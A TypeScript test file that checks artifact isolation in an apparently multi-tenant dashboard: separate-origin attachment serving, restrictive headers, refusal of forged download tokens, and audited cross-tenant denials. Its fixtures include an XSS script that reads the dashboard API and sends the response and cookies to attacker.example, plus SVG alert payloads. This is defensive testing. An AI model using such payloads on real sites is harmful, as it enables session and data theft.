import { describe, expect, it, beforeAll, afterAll } from 'vitest';
import { createHarness, produce, sha256, type Harness } from './harness.ts';

// The authenticated dashboard is served from its own origin (W-014); artifacts never are.
const DASHBOARD_ORIGIN = 'http://localhost:4173';
const hostileHtml = Buffer.from(`<!doctype html><html><body><h1>Report</h1>
<script>fetch('${DASHBOARD_ORIGIN}/v2/tasks', { credentials: 'include' }).then(r => r.text()).then(t => navigator.sendBeacon('https://attacker.example', t + document.cookie));</script>
</body></html>`);
const hostileSvg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>alert(1)</script></svg>');

describe('AC-49 artifact content isolation', () => {
  let h: Harness;
  beforeAll(async () => { h = await createHarness('ac49'); });
  afterAll(async () => { await h.close(); });

  async function upload(body: Buffer, mediaType: string) {
    return (await produce(h, h.service, h.a, body, mediaType, '1.0')).finalize();
  }

  it('an HTML report with script is served only as an attachment from a separate origin with restrictive headers', async () => {
    const ref = await upload(hostileHtml, 'text/html');
    const access = await h.service.access(h.human(h.a, h.a.taskId), ref.artifactId, 'review the generated report');
    expect(access.contentDisposition).toBe('attachment');
    expect(access.sha256).toBe(sha256(hostileHtml));
    expect(new URL(access.url).origin).not.toBe(new URL(DASHBOARD_ORIGIN).origin);
    const res = await fetch(access.url, { headers: { cookie: 'factory_session=stolen', authorization: 'Bearer dashboard-token', origin: DASHBOARD_ORIGIN } });
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('application/octet-stream');
    expect(res.headers.get('content-disposition')).toMatch(/^attachment; filename="artifact-[0-9a-f-]+\.bin"$/);
    expect(res.headers.get('x-content-type-options')).toBe('nosniff');
    const csp = res.headers.get('content-security-policy') ?? '';
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain('sandbox');
    expect(res.headers.get('access-control-allow-origin')).toBeNull();
    expect(res.headers.get('access-control-allow-credentials')).toBeNull();
    expect(res.headers.get('set-cookie')).toBeNull();
    expect(res.headers.get('cache-control')).toBe('private, no-store');
    expect(Buffer.from(await res.arrayBuffer()).equals(hostileHtml)).toBe(true); // bytes are preserved, never rewritten
  });

  it('SVG is active content too; only inert allow-listed types get an isolated inline preview, still sandboxed', async () => {
    const svg = await h.service.access(h.human(h.a, h.a.taskId), (await upload(hostileSvg, 'image/svg+xml')).artifactId, 'view diagram');
    expect(svg.contentDisposition).toBe('attachment');
    expect((await fetch(svg.url)).headers.get('content-type')).toBe('application/octet-stream');
    const text = await h.service.access(h.human(h.a, h.a.taskId), (await upload(Buffer.from('plain log <script>x</script>'), 'text/plain')).artifactId, 'read log');
    expect(text.contentDisposition).toBe('isolated_preview');
    const res = await fetch(text.url);
    expect(res.headers.get('content-type')).toBe('text/plain; charset=utf-8');
    expect(res.headers.get('content-disposition')).toBe('inline');
    expect(res.headers.get('content-security-policy')).toContain('sandbox');
  });

  it('the download capability is the only credential: tampered or expired links are refused', async () => {
    const access = await h.service.access(h.human(h.a, h.a.taskId), (await upload(hostileHtml, 'text/html')).artifactId, 'download');
    const token = access.url.split('/d/')[1] ?? '';
    const [body, mac] = token.split('.');
    const decoded = JSON.parse(Buffer.from(body ?? '', 'base64url').toString()) as Record<string, unknown>;
    const forged = `${Buffer.from(JSON.stringify({ ...decoded, disposition: 'isolated_preview', mediaType: 'text/html' })).toString('base64url')}.${mac ?? ''}`;
    expect((await fetch(`${h.origin.url}/d/${forged}`)).status).toBe(403);
    expect((await fetch(`${h.origin.url}/d/garbage`)).status).toBe(403);
    expect((await fetch(`${h.origin.url}/d/${token}`, { method: 'POST' })).status).toBe(403);
    h.clock.now += 6 * 60 * 1000;
    try {
      expect((await fetch(access.url)).status).toBe(403);
    } finally {
      h.clock.now -= 6 * 60 * 1000;
    }
  });

  it('access is authorized per caller-visible link, audited, and an ID from another organization grants nothing', async () => {
    const ref = await upload(Buffer.concat([hostileHtml, Buffer.from('<!-- unique -->')]), 'text/html');
    await expect(h.service.access(h.human(h.a), ref.artifactId, 'curious')).rejects.toMatchObject({ code: 'not_found' }); // not bound to the linked task
    await expect(h.service.access(h.human(h.b, h.b.taskId), ref.artifactId, 'cross-tenant')).rejects.toMatchObject({ code: 'not_found' });
    await expect(h.service.view(h.human(h.b, h.a.taskId), ref.artifactId)).rejects.toMatchObject({ code: 'not_found' });
    await h.service.access(h.human(h.a, h.a.taskId), ref.artifactId, 'audited download');
    const audit = await h.db.withTenant({ orgId: h.a.orgId }, (tx) => tx.query<{ action: string; outcome: string }>("SELECT action, outcome FROM factory.audit_event WHERE resource_id = $1 AND action IN ('artifact.access','artifact.read') ORDER BY created_at", [ref.artifactId]));
    expect(audit.rows).toEqual([{ action: 'artifact.read', outcome: 'denied' }, { action: 'artifact.access', outcome: 'allowed' }]);
    const foreign = await h.db.withTenant({ orgId: h.b.orgId }, (tx) => tx.query<{ outcome: string }>("SELECT outcome FROM factory.audit_event WHERE resource_id = $1", [ref.artifactId]));
    expect(foreign.rows).toEqual([{ outcome: 'denied' }, { outcome: 'denied' }]); // both cross-tenant attempts are on record in the caller's organization
    const view = await h.service.view(h.human(h.a, h.a.taskId), ref.artifactId);
    expect(view.ref).toEqual(ref);
    expect(view.links).toEqual([expect.objectContaining({ taskId: h.a.taskId, stageRunId: h.a.logicalStageId, purpose: 'stage_output' })]);
  });
});
